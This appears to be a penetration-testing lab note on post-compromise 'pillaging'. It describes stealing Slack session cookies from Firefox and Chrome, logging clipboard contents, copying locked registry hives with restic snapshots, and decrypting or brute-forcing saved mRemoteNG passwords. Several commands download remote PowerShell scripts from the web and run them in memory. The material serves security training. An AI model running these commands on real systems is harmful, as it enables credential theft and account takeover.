
## Table of Contents:

- [[#Cookie Stealing to access IM clients|Cookie Stealing]]
- [[#Clipboard]]
- [[#Restic Backup Attack]]
- [[#Data Sources]]
- [[#[mRemoteNG](https //mremoteng.org/)|mRemoteNG]]

Pillaging is the process of obtaining information from a compromised system.

---
## Cookie Stealing to access IM clients

### Firefox

[SlackExtract](https://github.com/clr2of8/SlackExtract) is a tool which discusses how the cookie named `d` is used to store the user's authentication token in Slack. 

```PowerShell
PS C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
### Copying Firefox Cookie Databse using wildcard in PS
```

[cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) is used to extract cookies from Firefox cookies.SQLite database.

```sh
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
```

[Cookie-Editor](https://cookie-editor.cgagnier.ca/) can be used to edit firefox's cookie and login.

### Chromium-based browsers

In these the cookie value is encrypted with [Data Protection API (DPAPI)](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection). 

[SharpChromium](https://github.com/djhohnstein/SharpChromium) connects to the current user SQLite cookie database, decrypts the cookie value, and presents the result in JSON format. [Invoke-SharpChromium](https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1) by [S3cur3Th1sSh1t](https://twitter.com/ShitSecure) uses reflection to load Sharp-Chromium.

```PowerShell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1') 

PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"
```

```PowerShell
PS C:\htb> copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
### This copies the files to the dir SharpChromium is looking in.
```

---
## Clipboard

We can use the [Invoke-Clipboard](https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1) script to monitor user clipboard data.

```PowerShell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1') 
PS C:\htb> Invoke-ClipboardLogger
```

```Note
User credentials can be obtained with tools such as Mimikatz or a keylogger. C2 Frameworks such as Metasploit contain built-in functions for keylogging.
```

---
## Restic Backup Attack

`Restic` is a modern program that can back up files in Linux, BSD, Mac, and Windows.

```Note
If the user doesn't have the access rights to the dir, we may get an Access denied message. The backup will be created, but no content will be found.
```

To start working with `restic`, we must create a `repository` (the directory where backups will be stored). [Restic]([https://github.com/restic/restic/releases/latest](https://github.com/restic/restic/releases/latest).) checks if the environment variable `RESTIC_PASSWORD` is set and uses its content as the password for the repository.

```PowerShell
PS C:\htb> mkdir E:\restic2; restic.exe -r E:\restic2 init
### setting up dir for restic to take backup in

PS C:\htb> $env:RESTIC_PASSWORD = 'Password'
PS C:\htb> restic.exe -r E:\restic2\ backup C:\SampleFolder
### Creating first backup

PS C:\htb> restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot
### Backing up a directory in use by creating Volume Shadow Copy with a snapshot

PS C:\htb> restic.exe -r E:\restic2\ snapshots
### Checking saved backups

PS C:\htb> restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore
### Restoring backup using ID
```

---

Remember to be CREATIVE.

---
## Data Sources

Below are some of the sources from which we can obtain information from compromised systems:

- Installed applications
- Installed services
    - Websites
    - File Shares
    - Databases
    - Directory Services (such as Active Directory, Azure AD, etc.)
    - Name Servers
    - Deployment Services
    - Certificate Authority
    - Source Code Management Server
    - Virtualization
    - Messaging
    - Monitoring and Logging Systems
    - Backups
- Sensitive Data
    - Keylogging
    - Screen Capture
    - Network Traffic Capture
    - Previous Audit reports
- User Information
    - History files, interesting documents (.doc/x,.xls/x,password._/pass._, etc)
    - Roles and Privileges
    - Web Browsers
    - IM Clients

This is not a complete list. Anything that can provide information about our target will be valuable.

---
## [mRemoteNG](https://mremoteng.org/)

It is used to manage and connect to remote systems using VNC, RDP, SSH, and similar protocols. It saves connection info and credentials to a file called `confCons.xml`. They use a hardcoded master password, `mR3m`, so if anyone starts saving credentials in `mRemoteNG` and does not protect the configuration with a password, we can access the configuration file and decrypt them.

```PowerShell
PS C:\htb> ls C:\Users\julio\AppData\Roaming\mRemoteNG
### The protected attribute in the config is the master password.
```

If not a custom masterpassword we can use [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) to decrypt the password. If we know the master password we can use flag `-p` to pass it.

```sh
> python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig=="
### Cracking Node Password when their is default master password

> for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done
### Cracking the Node Password with for loop for master password 
```

---
